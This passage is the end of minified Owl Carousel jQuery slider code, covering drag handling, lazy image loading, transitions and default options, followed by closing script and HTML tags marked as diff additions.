0!==b.preventDefault?b.preventDefault():b.returnValue=!1,h.sliding=!0);(10<d.newPosY||-10>d.newPosY)&&!1===h.sliding&&f(k).off("touchmove.owl");d.newPosX=Math.max(Math.min(d.newPosX,d.newRelativeX/5),d.maximumPixels+d.newRelativeX/5);!0===d.browser.support3d?d.transition3d(d.newPosX):d.css2move(d.newPosX)}function c(a){a=a.originalEvent||a||g.event;var c;a.target=a.target||a.srcElement;h.dragging=!1;!0!==d.browser.isTouch&&d.$owlWrapper.removeClass("grabbing");d.dragDirection=0>d.newRelativeX?d.owl.dragDirection="left":d.owl.dragDirection="right";0!==d.newRelativeX&&(c=d.getNewPosition(),d.goTo(c,!1,"drag"),h.targetElement===a.target&&!0!==d.browser.isTouch&&(f(a.target).on("click.disable",function(a){a.stopImmediatePropagation();a.stopPropagation();a.preventDefault();f(a.target).off("click.disable")}),a=f._data(a.target,"events").click,c=a.pop(),a.splice(0,0,c)));b("off")}var d=this,h={offsetX:0,offsetY:0,baseElWidth:0,relativePos:0,position:null,minSwipe:null,maxSwipe:null,sliding:null,dargging:null,targetElement:null};d.isCssFinish=!0;d.$elem.on(d.ev_types.start,".owl-wrapper",function(c){c=c.originalEvent||c||g.event;var e;if(3===c.which)return!1;if(!(d.itemsAmount<=d.options.items)){if(!1===d.isCssFinish&&!d.options.dragBeforeAnimFinish||!1===d.isCss3Finish&&!d.options.dragBeforeAnimFinish)return!1;!1!==d.options.autoPlay&&g.clearInterval(d.autoPlayInterval);!0===d.browser.isTouch||d.$owlWrapper.hasClass("grabbing")||d.$owlWrapper.addClass("grabbing");d.newPosX=0;d.newRelativeX=0;f(this).css(d.removeTransition());e=f(this).position();h.relativePos=e.left;h.offsetX=a(c).x-e.left;h.offsetY=a(c).y-e.top;b("on");h.sliding=!1;h.targetElement=c.target||c.srcElement}})},getNewPosition:function(){var a=this.closestItem();a>this.maximumItem?a=this.currentItem=this.maximumItem:0<=this.newPosX&&(this.currentItem=a=0);return a},closestItem:function(){var a=this,b=!0===a.options.scrollPerPage?a.pagesInArray:a.positionsInArray,e=a.newPosX,c=null;f.each(b,function(d,g){e-a.itemWidth/20>b[d+1]&&e-a.itemWidth/20<g&&"left"===a.moveDirection()?(c=g,a.currentItem=!0===a.options.scrollPerPage?f.inArray(c,a.positionsInArray):d):e+a.itemWidth/20<g&&e+a.itemWidth/20>(b[d+1]||b[d]-a.itemWidth)&&"right"===a.moveDirection()&&(!0===a.options.scrollPerPage?(c=b[d+1]||b[b.length-1],a.currentItem=f.inArray(c,a.positionsInArray)):(c=b[d+1],a.currentItem=d+1))});return a.currentItem},moveDirection:function(){var a;0>this.newRelativeX?(a="right",this.playDirection="next"):(a="left",this.playDirection="prev");return a},customEvents:function(){var a=this;a.$elem.on("owl.next",function(){a.next()});a.$elem.on("owl.prev",function(){a.prev()});a.$elem.on("owl.play",function(b,e){a.options.autoPlay=e;a.play();a.hoverStatus="play"});a.$elem.on("owl.stop",function(){a.stop();a.hoverStatus="stop"});a.$elem.on("owl.goTo",function(b,e){a.goTo(e)});a.$elem.on("owl.jumpTo",function(b,e){a.jumpTo(e)})},stopOnHover:function(){var a=this;!0===a.options.stopOnHover&&!0!==a.browser.isTouch&&!1!==a.options.autoPlay&&(a.$elem.on("mouseover",function(){a.stop()}),a.$elem.on("mouseout",function(){"stop"!==a.hoverStatus&&a.play()}))},lazyLoad:function(){var a,b,e,c,d;if(!1===this.options.lazyLoad)return!1;for(a=0;a<this.itemsAmount;a+=1)b=f(this.$owlItems[a]),"loaded"!==b.data("owl-loaded")&&(e=b.data("owl-item"),c=b.find(".lazyOwl"),"string"!==typeof c.data("src")?b.data("owl-loaded","loaded"):(void 0===b.data("owl-loaded")&&(c.hide(),b.addClass("loading").data("owl-loaded","checked")),(d=!0===this.options.lazyFollow?e>=this.currentItem:!0)&&e<this.currentItem+this.options.items&&c.length&&this.lazyPreload(b,c)))},lazyPreload:function(a,b){function e(){a.data("owl-loaded","loaded").removeClass("loading");b.removeAttr("data-src");"fade"===d.options.lazyEffect?b.fadeIn(400):b.show();"function"===typeof d.options.afterLazyLoad&&d.options.afterLazyLoad.apply(this,[d.$elem])}function c(){f+=1;d.completeImg(b.get(0))||!0===k?e():100>=f?g.setTimeout(c,100):e()}var d=this,f=0,k;"DIV"===b.prop("tagName")?(b.css("background-image","url("+b.data("src")+")"),k=!0):b[0].src=b.data("src");c()},autoHeight:function(){function a(){var a=f(e.$owlItems[e.currentItem]).height();e.wrapperOuter.css("height",a+"px");e.wrapperOuter.hasClass("autoHeight")||g.setTimeout(function(){e.wrapperOuter.addClass("autoHeight")},0)}function b(){d+=1;e.completeImg(c.get(0))?a():100>=d?g.setTimeout(b,100):e.wrapperOuter.css("height","")}var e=this,c=f(e.$owlItems[e.currentItem]).find("img"),d;void 0!==c.get(0)?(d=0,b()):a()},completeImg:function(a){return!a.complete||"undefined"!==typeof a.naturalWidth&&0===a.naturalWidth?!1:!0},onVisibleItems:function(){var a;!0===this.options.addClassActive&&this.$owlItems.removeClass("active");this.visibleItems=[];for(a=this.currentItem;a<this.currentItem+this.options.items;a+=1)this.visibleItems.push(a),!0===this.options.addClassActive&&f(this.$owlItems[a]).addClass("active");this.owl.visibleItems=this.visibleItems},transitionTypes:function(a){this.outClass="owl-"+a+"-out";this.inClass="owl-"+a+"-in"},singleItemTransition:function(){var a=this,b=a.outClass,e=a.inClass,c=a.$owlItems.eq(a.currentItem),d=a.$owlItems.eq(a.prevItem),f=Math.abs(a.positionsInArray[a.currentItem])+a.positionsInArray[a.prevItem],g=Math.abs(a.positionsInArray[a.currentItem])+a.itemWidth/2;a.isTransition=!0;a.$owlWrapper.addClass("owl-origin").css({"-webkit-transform-origin":g+"px","-moz-perspective-origin":g+"px","perspective-origin":g+"px"});d.css({position:"relative",left:f+"px"}).addClass(b).on("webkitAnimationEnd oAnimationEnd MSAnimationEnd animationend",function(){a.endPrev=!0;d.off("webkitAnimationEnd oAnimationEnd MSAnimationEnd animationend");a.clearTransStyle(d,b)});c.addClass(e).on("webkitAnimationEnd oAnimationEnd MSAnimationEnd animationend",function(){a.endCurrent=!0;c.off("webkitAnimationEnd oAnimationEnd MSAnimationEnd animationend");a.clearTransStyle(c,e)})},clearTransStyle:function(a,b){a.css({position:"",left:""}).removeClass(b);this.endPrev&&this.endCurrent&&(this.$owlWrapper.removeClass("owl-origin"),this.isTransition=this.endCurrent=this.endPrev=!1)},owlStatus:function(){this.owl={userOptions:this.userOptions,baseElement:this.$elem,userItems:this.$userItems,owlItems:this.$owlItems,currentItem:this.currentItem,prevItem:this.prevItem,visibleItems:this.visibleItems,isTouch:this.browser.isTouch,browser:this.browser,dragDirection:this.dragDirection}},clearEvents:function(){this.$elem.off(".owl owl mousedown.disableTextSelect");f(k).off(".owl owl");f(g).off("resize",this.resizer)},unWrap:function(){0!==this.$elem.children().length&&(this.$owlWrapper.unwrap(),this.$userItems.unwrap().unwrap(),this.owlControls&&this.owlControls.remove());this.clearEvents();this.$elem.attr("style",this.$elem.data("owl-originalStyles")||"").attr("class",this.$elem.data("owl-originalClasses"))},destroy:function(){this.stop();g.clearInterval(this.checkVisible);this.unWrap();this.$elem.removeData()},reinit:function(a){a=f.extend({},this.userOptions,a);this.unWrap();this.init(a,this.$elem)},addItem:function(a,b){var e;if(!a)return!1;if(0===this.$elem.children().length)return this.$elem.append(a),this.setVars(),!1;this.unWrap();e=void 0===b||-1===b?-1:b;e>=this.$userItems.length||-1===e?this.$userItems.eq(-1).after(a):this.$userItems.eq(e).before(a);this.setVars()},removeItem:function(a){if(0===this.$elem.children().length)return!1;a=void 0===a||-1===a?-1:a;this.unWrap();this.$userItems.eq(a).remove();this.setVars()}};f.fn.owlCarousel=function(a){return this.each(function(){if(!0===f(this).data("owl-init"))return!1;f(this).data("owl-init",!0);var b=Object.create(l);b.init(a,this);f.data(this,"owlCarousel",b)})};f.fn.owlCarousel.options={items:5,itemsCustom:!1,itemsDesktop:[1199,4],itemsDesktopSmall:[979,3],itemsTablet:[768,2],itemsTabletSmall:!1,itemsMobile:[479,1],singleItem:!1,itemsScaleUp:!1,slideSpeed:200,paginationSpeed:800,rewindSpeed:1E3,autoPlay:!1,stopOnHover:!1,navigation:!1,navigationText:["prev","next"],rewindNav:!0,scrollPerPage:!1,pagination:!0,paginationNumbers:!1,responsive:!0,responsiveRefreshRate:200,responsiveBaseWidth:g,baseClass:"owl-carousel",theme:"owl-theme",lazyLoad:!1,lazyFollow:!0,lazyEffect:"fade",autoHeight:!1,jsonPath:!1,jsonSuccess:!1,dragBeforeAnimFinish:!0,mouseDrag:!0,touchDrag:!0,addClassActive:!1,transitionStyle:!1,beforeUpdate:!1,afterUpdate:!1,beforeInit:!1,afterInit:!1,beforeMove:!1,afterMove:!1,afterAction:!1,startDragging:!1,afterLazyLoad:!1}})(jQuery,window,document);
+
+
+
+//]]>
+</script>
+
+
+
+</body>
+</html>
